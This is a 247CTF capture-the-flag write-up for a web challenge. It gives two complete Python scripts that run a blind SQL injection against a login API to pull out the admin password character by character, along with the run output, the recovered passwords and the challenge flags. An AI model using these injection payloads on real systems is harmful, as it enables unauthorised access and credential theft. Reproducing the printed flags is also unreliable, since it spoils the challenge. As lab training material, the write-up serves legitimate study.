# Web: The Flag API Key

## Previous Flag
```
247CTF{aff83b946e64e299a08f50b8ba0161ff}
```

## Goal
We created an API service which has a few endpoints. Can you use the API to figure out the admin user’s password? The admin user’s password uses the same character set and length as the flag (32-HEX).

## What I learned
```
Blind SQL Injection

Each password character is one hexadecimal digit (0–f), which fits into 4 bits (a nibble)(Since said it 32-HEX)
0 | 0000
1 | 0001 
2 | 0010 
3 | 0011 
4 | 0100 
5 | 0101                            data[0] (8-bit = 1): {8,9,a,b,c,d,e,f}
6 | 0110                            data[1] (4-bit = 1): {4,5,6,7,c,d,e,f}
7 | 0111                            data[2] (2-bit = 1): {2,3,6,7,a,b,e,f}
8 | 1000                            data[3] (1-bit = 1): {1,3,5,7,9,b,d,f}
9 | 1001 
a | 1010 
b | 1011 
c | 1100 
d | 1101 
e | 1110 
f | 1111 

Plan:
    Fetches an API token from the server
    Performs a blind SQL injection on the login API endpoint to extract the admin password character by character
        Note: 128 login to crack admin password (32-hex) else admin password resets
    Uses a binary search strategy on hexadecimal characters for efficiency
    Once the password is fully recovered, it submits the password to the get_flag endpoint to retrieve the flag
         POST request to /api/get_flag using curl vs GET if do browser but blocked
```

## Solution
```
START CHALLENGE

https://b6db7eccfc93eea4.247ctf.com/

Documentation
    /api/get_flag
    Methods: OPTIONS POST
    Arguments: None
    Description: Retrieve the flag (invalid password will reset the admin's password)
    POST data: password
    Example data: password=4764fe68c18380e2dbc0bccbdc862691

    /api/get_token
    Methods: GET HEAD OPTIONS
    Arguments:None
    Description: Request an API token valid for 128 requests (will also reset the admin's password)

    /api/login
    Methods: OPTIONS POST
    Arguments:None
    Description: User login endpoint
    POST data: username, password, api
    Example Data: username=admin&password=4764fe68c18380e2dbc0bccbdc862691&api=06c6e1d3fae974defb8ee5f59c471bf2

Method 1:
AsianHacker-picoctf@webshell:~$ vi pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ chmod u+x pythonScript.py ⌨️ 
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
import requests
import json

target_url="https://b6db7eccfc93eea4.247ctf.com/"

# API endpoints
login_url = target_url+"api/login"                                          # Endpoint to attempt login
get_token_url = target_url+"api/get_token"                                  # Endpoint to get an API token
get_flag_url = target_url+"api/get_flag"                                    # Endpoint to get the flag

# Get the API token
response = requests.get(target_url + 'api/get_token')                       # Request a token from the server
response_dict = json.loads(response.text)                                   # Parse JSON response
token = response_dict["message"].split()[-1][:-1]                           # Extract token from message string
print(token)

key = token  # Use the token as API key

# Function to perform a range-based SQL injection query
def query_range(str_pos, bottom, top):
    bottom_char = chr(bottom)                                               # Convert ASCII code to character
    top_char = chr(top)                                                     # Convert ASCII code to character

    print(f"trying {bottom_char}, {top_char} at position {str_pos}")

    # Construct the SQL injection payload using a range for the character at position `str_pos`
    data = {
            'username': "admin' and SUBSTR(password," + str_pos + ",1) BETWEEN '" + bottom_char + "' AND '" + top_char + "'--",
            'password':"",
            'api':key
            }

    r = requests.post(login_url, data=data)                                 # Send POST request with payload
    return r                                                                # Return the response

# Function to perform a direct SQL injection query for a specific character
def query_direct(str_pos, val):
    val_char = chr(val)                                                     # Convert ASCII code to character
    print(f"trying {val_char}")

    # Construct the SQL injection payload to check if password character equals `val_char`
    data = {
            'username': "admin' and SUBSTR(password," + str_pos + ",1) == '" + val_char +"'--",
            'password':"",
            'api':key
            }
    r = requests.post(login_url, data=data)                                 # Send POST request with payload
    return r  # Return the response

# Function to get the flag using the retrieved password
def get_flag(password):
    data = {
            'password':password,
            }
    r = requests.post(get_flag_url, data=data)                              # Send POST request with password
    return r  # Return the server response containing the flag

# Characters that can appear in the password (hexadecimal)
possible_chars= ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
possible_ords = list(map(ord, possible_chars))                              # Convert characters to their ASCII codes

# Recursive binary search function to find the correct character at a given position
def binary_search(str_pos, arr, low, high):
    mid = (high + low) // 2                                                 # Middle index of current search range

    # If there are only 2 elements left
    if high - low == 1:
        r_low = query_direct(str_pos, arr[low])                             # Test the lower element
        if "Welcome back admin" in r_low.text:                              # Check if login succeeded
            return low
        else:
            return high

    # If there are only 3 elements left
    if high - low == 2:
        r_low = query_direct(str_pos, arr[low])                             # Test the lower element
        if "Welcome back admin" in r_low.text:
            return low
        else:
            r_mid = query_direct(str_pos, arr[mid])                         # Test the middle element
            if "Welcome back admin" in r_mid.text:
                return mid
            else:
                return high                 # Otherwise, the upper element is correct

    # Perform a range query on the lower half
    r = query_range(str_pos, arr[low], arr[mid])

    # If password character is in the lower half
    if "Welcome back admin" in r.text:
        print(f"in range of {low}, {mid-1}")
        return binary_search(str_pos, arr, low, mid)                        # Recurse into lower half
    else:
        print(f"in range of {mid+1}, {high}")
        return binary_search(str_pos, arr, mid + 1, high)                   # Recurse into upper half

password = ""  # Initialize password string

# Loop over each character position in the password (assuming 32-character password)
for pos in range(32):
    str_pos = str(pos+1)                    # SQLite SUBSTR function is 1-indexed
    res = binary_search(str_pos, possible_ords, 0, len(possible_ords)-1)    # Find character at current position
    pass_char = possible_chars[res]         # Map index back to character
    print(f"found: {pass_char}")
    password += pass_char                   # Append character to password

print(password)                             # Print the full password
r = get_flag(password)                      # Use password to get the flag
print(r.text)                               # Print the flag

AsianHacker-picoctf@webshell:~$ ./pythonScript.py ⌨️
import-im6.q16: unable to open X server `' @ error/import.c/ImportImageCommand/346. ⚠️     # forgot #!/usr/bin/python3
import-im6.q16: unable to open X server `' @ error/import.c/ImportImageCommand/346.
./pythonScript.py: line 6: login_url: command not found
./pythonScript.py: line 7: get_token_url: command not found
./pythonScript.py: line 8: get_flag_url: command not found
./pythonScript.py: line 11: syntax error near unexpected token `('
./pythonScript.py: line 11: `response = requests.get(target_url + 'api/get_token')'

AsianHacker-picoctf@webshell:~$ python3 pythonScript.py ⌨️
trying 0, 7 at position 29
in range of 0, 6
trying 0, 3 at position 29
in range of 0, 2
trying 0, 1 at position 29
in range of 2, 3
trying 2
found: 2
trying 0, 7 at position 30
in range of 8, 15
trying 8, b at position 30
in range of 12, 15
trying c, d at position 30
in range of 14, 15
trying e
found: e
trying 0, 7 at position 31
in range of 8, 15
trying 8, b at position 31
in range of 12, 15
trying c, d at position 31
in range of 14, 15
trying e
found: e
trying 0, 7 at position 32
in range of 0, 6
trying 0, 3 at position 32
in range of 0, 2
trying 0, 1 at position 32
in range of 2, 3
trying 2
found: 2
8c4a9f3eaa6d893e9479f31cd6f52ee2                                    # this is admin password
{"message":"247CTF{61f66e2b26507d2498f78b4a77665cb8}","result":"success"} 🔐

Method 2:
Browser [GET]: https://b6db7eccfc93eea4.247ctf.com/api/get_token ⌨️
{"message":"The API key has been reset to e0a3ac5fc93e29cf352595014b00eea2!","result":"success"} 👀

# Performs a blind SQL injection on the login API endpoint to extract the admin password character by character
# Use Postman or Burp Suite
[POST] https://b6db7eccfc93eea4.247ctf.com/api/login ⌨️
Key                                         Value
username                                    admin ⌨️
password                                    root ⌨️
api                                         e0a3ac5fc93e29cf352595014b00eea2! ⌨️

# Note: Get 32 character password correct impossible
# password 32-hex characters and each hex character has 16 possibilites. 16³² = 2¹²⁸ possible passwords 
# SQL Injection: works if there admin on table
username: admin’ OR 1=1; — ⌨️

AsianHacker-picoctf@webshell:~$ vi getPass.py ⌨️
AsianHacker-picoctf@webshell:~$ cat getPass.py ⌨️
import requests
import os

# set DOMAIN to instead of get from env
DOMAIN = os.getenv("DOMAIN", "b6db7eccfc93eea4")

token = requests.get(f"https://{DOMAIN}.247ctf.com/api/get_token").json()['message'][-33:-1]
print(token, len(token))
recovered_password = ''

for i in range(32):
    data = ["('8', '9', 'a', 'b', 'c', 'd', 'e', 'f')", "('4', '5', '6', '7', 'c', 'd', 'e', 'f')",
        "('2', '6', 'a', 'e', '3', '7', 'b', 'f')", "('1', '3', '5', '7', '9', 'b', 'd', 'f')"]
    for h in range(4):
        form = {'username': f"admin' AND SUBSTR(password, {i+1}, 1) IN {data[h]};--", 'password': 'p', 'api': token}
        msg = requests.post(f"https://{DOMAIN}.247ctf.com/api/login", data=form).json()['message'].lower()
        if msg.startswith("sqlite"):
            raise Exception("Change your exploit code.. Something is wrong!!")
        bit = '1' if msg.startswith('welcome') else '0'
        recovered_password += bit
    print(f"Recovered password till now is: {hex(int(recovered_password, 2))[2:]}")

AsianHacker-picoctf@webshell:~$ python3 getPass.py ⌨️
882a30422e61fb16af56754e6a64c81f 32 👀 new API
Recovered password till now is: a
Recovered password till now is: a9
Recovered password till now is: a9e
Recovered password till now is: a9ea
Recovered password till now is: a9ea9
Recovered password till now is: a9ea9f
Recovered password till now is: a9ea9fb
Recovered password till now is: a9ea9fb3
Recovered password till now is: a9ea9fb36
Recovered password till now is: a9ea9fb361
Recovered password till now is: a9ea9fb3613
Recovered password till now is: a9ea9fb36133
Recovered password till now is: a9ea9fb361338
Recovered password till now is: a9ea9fb361338d
Recovered password till now is: a9ea9fb361338d1
Recovered password till now is: a9ea9fb361338d1c
Recovered password till now is: a9ea9fb361338d1c4
Recovered password till now is: a9ea9fb361338d1c45
Recovered password till now is: a9ea9fb361338d1c45b
Recovered password till now is: a9ea9fb361338d1c45bd
Recovered password till now is: a9ea9fb361338d1c45bd3
Recovered password till now is: a9ea9fb361338d1c45bd37
Recovered password till now is: a9ea9fb361338d1c45bd372
Recovered password till now is: a9ea9fb361338d1c45bd3722
Recovered password till now is: a9ea9fb361338d1c45bd3722a
Recovered password till now is: a9ea9fb361338d1c45bd3722a5
Recovered password till now is: a9ea9fb361338d1c45bd3722a55
Recovered password till now is: a9ea9fb361338d1c45bd3722a558
Recovered password till now is: a9ea9fb361338d1c45bd3722a5582
Recovered password till now is: a9ea9fb361338d1c45bd3722a55824
Recovered password till now is: a9ea9fb361338d1c45bd3722a558242
Recovered password till now is: a9ea9fb361338d1c45bd3722a5582426 👀

# Note: Nested loops run 32 * 4 = 128 times with 4 requests per character, extracting entire password
[POST] https://b6db7eccfc93eea4.247ctf.com/api/get_flag ⌨️
password                        a9ea9fb361338d1c45bd3722a5582426 ⌨️

247CTF{61f66e2b26507d2498f78b4a77665cb8} 🔐
```

## Flag
247CTF{61f66e2b26507d2498f78b4a77665cb8}

## Continue
[Continue](../247ctf/MiscTheTextEditorJail.md)